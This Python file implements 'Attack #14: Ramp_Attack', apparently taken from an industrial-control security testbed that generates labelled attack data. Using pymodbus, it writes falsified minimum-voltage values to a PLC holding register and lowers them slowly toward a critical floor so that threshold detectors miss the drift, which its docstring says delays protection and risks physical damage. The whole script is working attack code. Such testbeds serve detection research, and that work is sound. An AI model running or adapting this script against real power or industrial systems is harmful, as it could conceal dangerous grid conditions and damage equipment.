"""
Attack #14: Ramp_Attack (Stealthy Gradual Deviation FDI)
=========================================================
Target register: HR5 (Min Voltage x1000)
Technique: Instead of an abrupt drop, the voltage reading is linearly
           interpolated down to a critical floor over the full duration of
           the attack, approaching the alarm threshold slowly enough to
           evade detectors that key on sudden changes.
Effect: Standard threshold-based detection struggles to catch this slow
        drift; protection reacts late, increasing the risk of physical
        damage.
MITRE ATT&CK for ICS: T0836 - Modify Parameter

Note: the ramp is computed as a continuous function of elapsed time rather
than a fixed per-step decrement, so it always spans exactly [0, duration_sec]
regardless of how long the scenario is run for, and does not plateau at the
floor value before the scenario ends.
"""

import time
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pymodbus.client import ModbusTcpClient
from attacks.config import (
    PLC_IP, PLC_PORT, UNIT_ID,
    HR5_MIN_VOLTAGE,
    LABEL_RAMP_ATTACK
)

# ---------------------------------------------------------------------------
# Attack parameters
# ---------------------------------------------------------------------------
START_VALUE   = 965          # 0.965 p.u. - normal system voltage
MIN_VALUE     = 650          # 0.650 p.u. - critical floor (ramp endpoint)
WRITE_INTERVAL = 1.0         # seconds between register writes

ATTACK_NAME = "Ramp_Attack"
ATTACK_ID   = LABEL_RAMP_ATTACK


def run_attack(duration_sec=600, label_manager=None):
    """
    Stealthy ramp attack.
    Linearly interpolates HR5 from START_VALUE down to MIN_VALUE across the
    full attack duration, so the floor is only reached at the very end.
    """
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

    if not client.connect():
        print(f"[-] PLC connection failed: {PLC_IP}:{PLC_PORT}")
        return False

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: HR{HR5_MIN_VOLTAGE} (Min Voltage)")
    print(f"  Start: {START_VALUE/1000:.3f} p.u. -> Floor: {MIN_VALUE/1000:.3f} p.u.")
    print(f"  Ramp spans the full {duration_sec}s ({duration_sec//60} min) duration")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"Ramp HR5: {START_VALUE}->{MIN_VALUE} over {duration_sec}s"
        )

    start_time = time.time()
    packet_count = 0

    try:
        while True:
            elapsed = time.time() - start_time
            if elapsed >= duration_sec:
                break
            try:
                fraction = min(1.0, elapsed / duration_sec)
                current_value = int(round(START_VALUE - (START_VALUE - MIN_VALUE) * fraction))
                client.write_register(address=HR5_MIN_VOLTAGE, value=current_value)
                packet_count += 1
            except Exception as e:
                if packet_count % 50 == 0:
                    print(f"  [RAMP] Reconnecting... ({e})")
                try:
                    client.close()
                    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
                    client.connect()
                except Exception:
                    pass
                time.sleep(0.5)
                continue

            if packet_count % 10 == 0:
                remaining = duration_sec - elapsed
                print(f"  [RAMP] step #{packet_count} | "
                      f"V={current_value/1000:.3f}pu | "
                      f"remaining: {remaining:.0f}s")

            time.sleep(WRITE_INTERVAL)

    except KeyboardInterrupt:
        print("\n  [RAMP] Manual stop!")

    finally:
        elapsed = time.time() - start_time
        final_v = current_value / 1000 if packet_count else START_VALUE / 1000
        client.close()
        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{packet_count} steps, final={final_v:.3f}pu, {elapsed:.1f}s"
            )
        print(f"\n  [RAMP] Attack finished: {packet_count} steps, "
              f"final voltage={final_v:.3f}pu, {elapsed:.1f}s")
        return True


if __name__ == "__main__":
    run_attack(duration_sec=60)
